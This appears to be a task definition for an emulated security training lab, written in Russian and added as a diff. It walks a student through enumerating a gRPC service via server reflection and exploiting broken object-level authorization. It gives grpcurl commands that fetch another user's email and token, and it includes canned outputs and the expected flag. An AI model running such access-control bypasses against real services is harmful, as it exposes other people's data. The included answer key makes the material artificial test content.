@@ -1,0 +1,29 @@
+{
+  "id": "web-grpc",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{grpc_r3fl3ct10n_t0_b0l4}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: gRPC reflection и BOLA\n\n`app.example:50051` — gRPC-сервис с включённым server reflection. Владелец\nобъекта в `GetUser` не проверяется.\n\n1. Убедись, что это gRPC, и перечисли сервисы:\n\n   grpcurl -plaintext app.example:50051 list\n\n2. Опиши метод и вызови его со СВОИМ id (1001), затем с ЧУЖИМ (1002):\n\n   grpcurl -plaintext -d '{\"id\":\"1002\"}' app.example:50051 myapp.UserService/GetUser\n\n3. В ответе на чужой id — email и токен жертвы (флаг). Запиши в `found.txt`,\n   затем `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (проверка Content-Type gRPC)",
+      "cases": [
+        { "match": "app\\.example:50051", "example": "-sI https://app.example:50051/", "output": "HTTP/2 200\ncontent-type: application/grpc\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только gRPC-фасад app.example:50051.\n"
+    },
+    "grpcurl": {
+      "help": "grpcurl -plaintext [-d json] <host:port> <method> — gRPC-клиент",
+      "cases": [
+        { "match": "1002", "example": "-plaintext -d '{\"id\":\"1002\"}' app.example:50051 myapp.UserService/GetUser", "output": "{\n  \"id\": \"1002\",\n  \"email\": \"victim@corp.com\",\n  \"token\": \"nto{grpc_r3fl3ct10n_t0_b0l4}\"\n}\n" },
+        { "match": "1001", "example": "-plaintext -d '{\"id\":\"1001\"}' app.example:50051 myapp.UserService/GetUser", "output": "{\n  \"id\": \"1001\",\n  \"email\": \"me@x.com\"\n}\n" },
+        { "match": "describe", "example": "-plaintext app.example:50051 describe myapp.UserService.GetUser", "output": "myapp.UserService.GetUser is a method:\nrpc GetUser ( .myapp.GetUserRequest ) returns ( .myapp.User );\n" },
+        { "match": "list", "example": "-plaintext app.example:50051 list", "output": "myapp.UserService\nmyapp.AdminService\n" }
+      ],
+      "fallback": "grpcurl: в этой лабе эмулируются list/describe/GetUser на app.example:50051.\n"
+    }
+  }
+}
